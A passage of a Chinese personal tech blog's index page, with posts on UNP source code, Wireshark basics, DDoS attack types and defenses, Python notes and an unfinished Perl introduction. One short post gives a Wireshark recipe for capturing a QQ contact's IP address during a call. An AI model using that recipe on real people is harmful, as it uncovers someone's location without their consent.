<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="Skuaka">


    
    


<meta name="description" content="For you, a thousand times over.">
<meta name="keywords" content="skuaka">
<meta property="og:type" content="website">
<meta property="og:title" content="Skuaka">
<meta property="og:url" content="http://skuaka.cn/page/10/index.html">
<meta property="og:site_name" content="Skuaka">
<meta property="og:description" content="For you, a thousand times over.">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Skuaka">
<meta name="twitter:description" content="For you, a thousand times over.">

<link rel="apple-touch-icon" href="/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Skuaka" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/avatar.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">


    <style> .article { opacity: 0;} </style>


<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Skuaka</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: true,
        isPost: false,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: 
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Skuaka</a></h1>
        </hgroup>

        
        <p class="header-subtitle">For you, a thousand times over.</p>
        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>Menu</li>
                        <li>Tags</li>
                        
                        <li>Friends</li>
                        
                        
                        <li>About Me</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">Home</a></li>
                        
                            <li><a href="/archives/">Archives</a></li>
                        
                            <li><a href="/tags/">Tags</a></li>
                        
                            <li><a href="/about/">about</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:skuaka@icloud.com" title="Email"></a>
                            
                                <a class="fa bilibili" href="https://space.bilibili.com/5006495" title="bilibili"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCIE/">CCIE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMake/">CMake</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS/">CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DDos/">DDos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DFS-BFS/">DFS,BFS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DTD/">DTD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DoNotStarve/">DoNotStarve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dreamweaver/">Dreamweaver</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Javascript/">Javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Macos/">Macos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Makefile/">Makefile</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MetaProgram/">MetaProgram</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mp3/">Mp3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OpenGL/">OpenGL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Perl/">Perl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PostgreSQL/">PostgreSQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QT/">QT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Raspberrypi/">Raspberrypi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLserver/">SQLserver</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shell/">Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Socks5/">Socks5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sorting/">Sorting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tcp-ip/">Tcp/ip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tree/">Tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wifi/">Wifi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wireshark/">Wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML/">XML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/apache/">apache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/base64/">base64</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/epoll/">epoll</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gcc-gdb/">gcc,gdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/html/">html</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reactor/">reactor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vultr/">vultr</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">专注于前端</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Skuaka</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Skuaka</a></h1>
            </hgroup>
            
            <p class="header-subtitle">For you, a thousand times over.</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">Home</a></li>
                
                    <li><a href="/archives/">Archives</a></li>
                
                    <li><a href="/tags/">Tags</a></li>
                
                    <li><a href="/about/">about</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:skuaka@icloud.com" title="Email"></a>
                            
                                <a class="fa bilibili" target="_blank" href="https://space.bilibili.com/5006495" title="bilibili"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="Tags" friends="Friends" about="About Me">
</nav>
      <div class="body-wrap">
  
    <article id="post-Network/Unp/unp_code" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/09/20/Network/Unp/unp_code/" class="article-date">
      <time datetime="2018-09-20T05:18:20.000Z" itemprop="datePublished">2018-09-20</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/20/Network/Unp/unp_code/">《unp》源代码问题笔记</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <ol>
<li><p>首先阅读主文件夹的README文件，进行configure和库的安装(make)，接下来所有程序都要用make编译，具体编译规则查看文件夹内的Makefile文件。</p>
</li>
<li><p>客户端程序连接时连接拒绝：<code>connect error: Connection refused</code></p>
<p>这时要看看源代码里的port是否和服务器程序的port相同，经我对比有的程序端口和书上不同。</p>
</li>
<li><p>tcpservpoll01编译时提示OPEN_MAX未定义，可见<code>&lt;limits.h&gt;</code>头文件不一定定义了OPEN_MAX。</p>
<p>于是我就在程序添加了三行代码，即可成功编译。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#ifndef         OPEN_MAX</span><br><span class="line">        #define OPEN_MAX        16</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
</li>
</ol>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Network/">Network</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Network/Wireshark/Wireshark入门" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/11/22/Network/Wireshark/Wireshark入门/" class="article-date">
      <time datetime="2018-11-22T13:45:16.000Z" itemprop="datePublished">2018-11-22</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/22/Network/Wireshark/Wireshark入门/">Wireshark 入门</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="Wireshark-入门"><a href="#Wireshark-入门" class="headerlink" title="Wireshark 入门"></a>Wireshark 入门</h2><h3 id="网卡混杂模式"><a href="#网卡混杂模式" class="headerlink" title="网卡混杂模式"></a>网卡混杂模式</h3><p>如果不设置混杂模式，你的计算机只能获取数据包发往的目标是你计算机和从你计算机出去的数据包。如果设置了混杂模式，你就可以捕获局域网中所有的数据包。</p>
<h3 id="过滤表达式"><a href="#过滤表达式" class="headerlink" title="过滤表达式"></a>过滤表达式</h3><p><strong>关系</strong></p>
<p>is present   如果选择的协议域存在，则显示相关数据包。<br>contains     判断一个协议，字段或者分片包含一个值<br>matches     判断一个协议或者字符串匹配一个给定的Perl表达式。</p>
<p><strong>Predefined values</strong><br>有些协议域包含了预先定义的值。如果你选择的协议域包含这样的值，你可以在这个列表中选择。</p>
<p><strong>函数</strong><br>upper(string－field)－把字符串转换成大写<br>lower(string－field)－把字符串转换成小写</p>
<p>例如：<br>upper(ncp.nds_stream_name) contains “BO56.COM”</p>
<h3 id="使用着色规则"><a href="#使用着色规则" class="headerlink" title="使用着色规则"></a>使用着色规则</h3><p>你经常会在数据包列表区域中看到不同的颜色。这就是wireshark做的很人性化的一方面。它可以让你指定条件，把符合条件的数据包按指定的颜色显示。这样你查找数据包会更方便些。</p>
<p>点击“view”菜单，然后选择“Coloring Rules”</p>
<p>注意：wireshark在应用规则的时候，是按自上而下的顺序去应用规则。因此刚添加的规则会优先应用。可以手动调整。</p>
<h3 id="使用图表"><a href="#使用图表" class="headerlink" title="使用图表"></a>使用图表</h3><h4 id="IO图"><a href="#IO图" class="headerlink" title="IO图"></a>IO图</h4><p>wireshark的IO图让你可以对网络上的吞吐量绘图。让你了解网络数据传输过程中的峰值和波动情况。通过“Statistics”菜单中的“IO Graphs”选项可以打开这个IO图对话框。</p>
<h4 id="RTT图"><a href="#RTT图" class="headerlink" title="RTT图"></a>RTT图</h4><p>wireshark还有一个功能就是可以对网络传输中的双向时间进行绘图。双向时间（round-trip time, RTT）,就是一个数据包被确认正常接收所花费的时间。</p>
<h3 id="跟踪tcp流"><a href="#跟踪tcp流" class="headerlink" title="跟踪tcp流"></a>跟踪tcp流</h3><p>跟踪TCP流这个功能可以将接收到的数据排好顺序使之容易查看，而不需要一小块一小块地看。这在查看HTTP、FTP等纯文本应用层协议时非常有用。</p>
<p>右键单击记录并选择Follow TCP Stream。这时TCP流就会在一个单独的窗口中显示出来。</p>
<p>这个窗口中的文字会有两种颜色。红色用于表示从源地址到目标地址的流量。蓝色是从目标地址到源地址的流量。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Network/">Network</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wireshark/">Wireshark</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Network/Wireshark/qq好友IP定位" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/11/17/Network/Wireshark/qq好友IP定位/" class="article-date">
      <time datetime="2018-11-17T08:49:34.000Z" itemprop="datePublished">2018-11-17</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/17/Network/Wireshark/qq好友IP定位/">qq好友IP定位</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="Wireshark-qq好友IP定位"><a href="#Wireshark-qq好友IP定位" class="headerlink" title="Wireshark qq好友IP定位"></a>Wireshark qq好友IP定位</h3><p>打开Wireshark，开启监听</p>
<p>CTRL+F筛选数据<br>选择搜索字符串<br>选择分组详情<br>查找数据<code>020048</code></p>
<p>然后拨打qq电话</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Network/">Network</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wireshark/">Wireshark</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Security/DDos/DDos攻击详解" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/11/17/Security/DDos/DDos攻击详解/" class="article-date">
      <time datetime="2018-11-17T12:01:50.000Z" itemprop="datePublished">2018-11-17</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/17/Security/DDos/DDos攻击详解/">DDos 攻击详解</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ol>
<li>Synflood<br>该攻击以多个随机的源主机地址向目的主机发送SYN包，而在收到目的主机的SYN ACK后并不回应，这样，目的主机就为这些源主机建立了大量的连接队列，而且由于没有收到ACK一直维护着这些队列，造成了资源的大量消耗，最终导致拒绝服务。</li>
<li>Smurf<br>该攻击向一个子网的广播地址发一个带有特定请求(如ICMP回应请求)的包，并且将源地址伪装成想要攻击的主机地址。子网上所有主机都回应广播包请求而向被攻击主机发包，使该主机受到攻击。</li>
<li>Land-based<br>攻击者将一个包的源地址和目的地址都设置为目标主机的地址，然后将该包通过IP欺骗的方式发送给被攻击主机，这种包可以造成被攻击主机因试图与自己建立连接而陷入死循环，从而很大程度地降低了系统性能。</li>
<li>Ping of Death<br>根据TCP/IP的规范，一个包的长度最大为65536字节。尽管一个包的长度不能超过65536字节，但是一个包分成的多个片段的叠加却能做到。当一个主机收到了长度大于65536字节的包时，就是受到了Ping of Death攻击，该攻击会造成主机的宕机。</li>
<li>Teardrop<br>IP数据包在网络传递时，数据包可以分成更小的片段。攻击者可以通过发送两段(或者更多)数据包来实现TearDrop攻击。第一个包的偏移量为0，长度为N，第二个包的偏移量小于N。为了合并这些数据段，TCP/IP堆栈会分配超乎寻常的巨大资源，从而造成系统资源的缺乏甚至机器的重新启动。</li>
<li>PingSweep<br>使用ICMP Echo轮询多个主机。</li>
<li>Pingflood<br>该攻击在短时间内向目的主机发送大量ping包，造成网络堵塞或主机资源耗尽。</li>
</ol>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>按攻击流量规模分类<br>(1) 较小流量：<br>小于1000Mbps，且在服务器硬件与应用接受范围之内，并不影响业务的： 利用iptables或者DDoS防护应用实现软件层防护。<br>(2) 大型流量：<br>大于1000Mbps，但在DDoS清洗设备性能范围之内，且小于机房出口，可能影响相同机房的其他业务的：利用iptables或者DDoS防护应用实现软件层防护，或者在机房出口设备直接配置黑洞等防护策略，或者同时切换域名，将对外服务IP修改为高负载Proxy集群外网IP，或者CDN高仿IP，或者公有云DDoS网关IP，由其代理到RealServer;或者直接接入DDoS清洗设备。<br>(3) 超大规模流量：<br>在DDoS清洗设备性能范围之外，但在机房出口性能之内，可能影响相同机房的其他业务，或者大于机房出口，已经影响相同机房的所有业务或大部分业务的：联系运营商检查分组限流配置部署情况并观察业务恢复情况。</li>
<li>按攻击流量协议分类<br>(1) syn/fin/ack等tcp协议包：<br>设置预警阀值和响应阀值，前者开始报警，后者开始处理，根据流量大小和影响程度调整防护策略和防护手段，逐步升级。<br>(2) UDP/DNS query等UDP协议包：<br>对于大部分游戏业务来说，都是TCP协议的，所以可以根据业务协议制定一份TCP协议白名单，如果遇到大量UDP请求，可以不经产品确认或者延迟跟产品确认，直接在系统层面/HPPS或者清洗设备上丢弃UDP包。<br>(3) http flood/CC等需要跟数据库交互的攻击：<br>这种一般会导致数据库或者webserver负载很高或者连接数过高，在限流或者清洗流量后可能需要重启服务才能释放连接数，因此更倾向在系统资源能够支撑的情况下调大支持的连接数。相对来说，这种攻击防护难度较大，对防护设备性能消耗很大。<br>(4) 其他：<br>icmp包可以直接丢弃，先在机房出口以下各个层面做丢弃或者限流策略。现在这种攻击已经很少见，对业务破坏力有限。</li>
</ol>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Security/">Security</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DDos/">DDos</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Script Language/Python/懒得整理的python学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/02/26/Script Language/Python/懒得整理的python学习笔记/" class="article-date">
      <time datetime="2018-02-25T17:17:05.000Z" itemprop="datePublished">2018-02-26</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/26/Script Language/Python/懒得整理的python学习笔记/">懒得整理的python学习笔记</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>str.join（list）</p>
<p>str.split（str）</p>
<p>str.find（str’）返回第一次出现str’偏移量</p>
<p>str.rfind（str’）最后一次</p>
<p>str.count（str’）出现次数</p>
<p>ord(‘s’)       返回ascii       115</p>
<p>chr(‘115’)    返回对应的字符      ‘s’</p>
<p>name.list（）初始化空列表</p>
<p>list.append（elem）</p>
<p>list.extend（list’）</p>
<p>list.insert（offset，elem）</p>
<p>list.remove（name）</p>
<p>del list[:1] 即 list[:1]=[]</p>
<p>list.pop（offset）提取出后删除，默认-1</p>
<p>list.index（elem）返回offset</p>
<p>if elem in list</p>
<p>list.sort（）会改变list</p>
<p>list.sorted（）返回排序好的，不改变list</p>
<p>复制list的方法</p>
<p> b=a.copy（）/  c=list（a）/   d=a[：]</p>
<p>元组解包 a，b，c = tuple</p>
<p>利用元组交换变量 a，b = b，a</p>
<p>dict.update（dict’）</p>
<p>dict.clear（）清空</p>
<p>dict.get（key，*可选内容）返回key对应的值 否则返回可选 否则返回None</p>
<p>dict.keys(）dict.values(）dict.items(）</p>
<p>在py3中要自己用list（）将返回值变成list</p>
<p>dict.copy（dict’）</p>
<p>set（）设置集合</p>
<p>a&amp;b=a.intersection（b）</p>
<p>a|b=a.union（b）</p>
<p>a-b=a.difference（b）</p>
<p>a^b=a.symmetric_difference(b）出现一次</p>
<p>a&lt;=b 即 a.issubset（b）   a&lt;b真子集</p>
<p>a&gt;=b 即 a.issuperset（b） a&gt;b真超集</p>
<p>output=open(r’C:\spam’,’w’)</p>
<p>input=open(‘data’) 默认为’r’</p>
<p>type（）返回参数的类型</p>
<p>\可以多行输入</p>
<p>for a,b,c in zip(<em>,</em>,*)</p>
<p>list(zip(a,b))       返回组合迭代对象</p>
<p>range（start，stop，*step）自然数</p>
<p>列表推导式[expression for item in iterable if condition ]</p>
<p>example.       cells=[(row,cop) for row in rows for cop in cols if…]</p>
<p>字典推导式</p>
<p>{key_expression : value_expression for expression in iterable}</p>
<p>example       letter_counts={letter : word.count(letter) for letter in set(word)}</p>
<p>集合推导式 略</p>
<p>def fun（）：</p>
<p>​      pass </p>
<p>#什么都不做，返回None</p>
<p>关键字参数 fun（参数1=？，参数2=？）参数位置可改变</p>
<p>*（位置参数收集）将一组可变数量的位置参数集合成参数值的元组</p>
<p>**（关键字参数收集）将参数收集到字典中，参值对应。</p>
<p>函数开头可以写文档字符串</p>
<p>help（fun）打印出fun的形参和文档字符串</p>
<p>print（fun.<strong>doc</strong>）仅打印文档字符串</p>
<p>（lambda 参数：定义）匿名小函数 🤔</p>
<p>生成器函数def my_range（first=0，last=10，step=1）：</p>
<p>​      number = first</p>
<p>​      while number &lt; last：</p>
<p>​               <strong>yield</strong> number</p>
<p>​               number+=step</p>
<p>ranger = my_range（1，5）</p>
<p>for x in ranger：</p>
<p>​        print （x）</p>
<p>global 声明 在局部命名空间引用全局变量</p>
<p>locals（） globals（）返回局部/全局命名空间内容的字典</p>
<p>别名导入模块。from ？ import  ？ as ？</p>
<p>两个计数器Counter（）可以用集合的方法</p>
<p>pprint（）友好输出</p>
<p>input()支持表达式和数字，不支持字符串。raw_input()支持字符串</p>
<p>print(value, …, sep=’ ‘, end=’\n’, file=sys.stdout, flush=False)</p>
<p>def  <strong>init</strong>（self，…）</p>
<p>super().name=</p>
<p>name=property（get_name,set_name)</p>
<p>@property</p>
<p>@name.setter（省略setter则无法从直接从外部设置值）</p>
<p>以<strong>开头命名的类特性不能直接访问，但可以 （特定类._类名</strong>类特性） 访问。</p>
<p>@classmethod 类方法 类参数约定为cls</p>
<p>魔术方法<strong>eq</strong>(self, other) </p>
<p>​               return  self == other</p>
<p>类似的 ne !=      lt &lt;     gt  &gt;.   le &lt;=.   ge &gt;=</p>
<p>add+ sub- mul* floordiv// truediv/ mod% pow**         str(print  repr(交互式str len</p>
<p>命名元组 from collections import namedtuple</p>
<p>Duck=namedtuple(‘Duck’,’bill tail’)</p>
<p>duck=Duck(‘wide orange’,’long’)</p>
<p>>&gt;&gt;duck.bill</p>
<p>‘wide orange’</p>
<p>parts={‘bill’=’wide orange’,’tail’=’long’}</p>
<p>duck2=Duck(**parts)//用字典创建</p>
<p>命名元组是不可变的，蛋可以替换其中某些域的值并返回一个新的命名元组</p>
<p>duck3=duck2._replace(‘bill’=</p>
<p>%! &lt;20s 左对齐20个字符，空位用!填充</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Python/">Python</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Script Language/Perl/Perl入门" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/11/30/Script Language/Perl/Perl入门/" class="article-date">
      <time datetime="2018-11-30T08:21:48.000Z" itemprop="datePublished">2018-11-30</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/30/Script Language/Perl/Perl入门/">Perl 入门</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="Perl-简介"><a href="#Perl-简介" class="headerlink" title="Perl 简介"></a>Perl 简介</h2><p>Perl 是 Practical Extraction and Report Language 的缩写，可翻译为 “实用报表提取语言”。</p>
<p>Perl 最重要的特性是Perl内部集成了正则表达式的功能，以及巨大的第三方代码库CPAN。</p>
<p>Perl具有高级语言（如C）的强大能力和灵活性。它的许多特性是从C语言中借用来的。</p>
<p>Perl提供脚本语言（如sed和awk）的所有功能，还具有它们所不具备的很多功能。Perl还支持sed到Perl及awk到Perl的翻译器。</p>
<p>简而言之，Perl像C一样强大，像awk、sed等脚本描述语言一样方便。</p>
<ul>
<li>Perl 是可扩展的，我们可以通过<a href="http://cpan.perl.org/" target="_blank" rel="noopener">CPAN（”the Comprehensive Perl Archive Network”全面的 Perl 存档网络）</a>中心仓库找到很多我们需要的模块。</li>
</ul>
<h2 id="Perl-语法"><a href="#Perl-语法" class="headerlink" title="Perl 语法"></a>Perl 语法</h2><h3 id="交互式编程"><a href="#交互式编程" class="headerlink" title="交互式编程"></a>交互式编程</h3><p>在命令行中使用 <strong>-e</strong> 选项来输入语句来执行代码，实例如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;print &quot;Hello World\n&quot;&apos;</span><br></pre></td></tr></table></figure>
<h3 id="脚本式编程"><a href="#脚本式编程" class="headerlink" title="脚本式编程"></a>脚本式编程</h3><p>将以下代码放到 <strong>hello.pl</strong> 文件中，然后添加执行权限。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="comment"># 输出 "Hello, World"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hello, world\n"</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"Hello, world\n"</span>);</span><br><span class="line"><span class="comment">#两种函数表示法等效</span></span><br></pre></td></tr></table></figure>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>perl 也支持多行注释，最常用的方法是使用 POD(Plain Old Documentations) 来进行多行注释。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 这是一个单行注释</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hello, world\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">=pod 注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">=cut</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  =pod、 